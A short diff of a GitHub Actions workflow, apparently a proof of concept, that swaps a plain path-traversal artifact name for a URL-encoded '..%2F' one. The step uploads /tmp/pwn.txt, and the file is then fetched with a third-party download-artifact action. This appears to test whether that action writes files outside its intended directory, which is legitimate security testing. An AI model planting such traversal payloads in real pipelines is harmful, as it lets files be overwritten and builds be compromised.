@@ -15,7 +15,7 @@ jobs:
       - name: upload artifact
         uses: actions/upload-artifact@v3
         with:
-          name: ../../../../../../cake
+          name: ..%2F..%2F..%2F..%2F..%2F..%2Fcake
           path: /tmp/pwn.txt
       - name: Download artifacts
         uses: dawidd6/action-download-artifact@v2
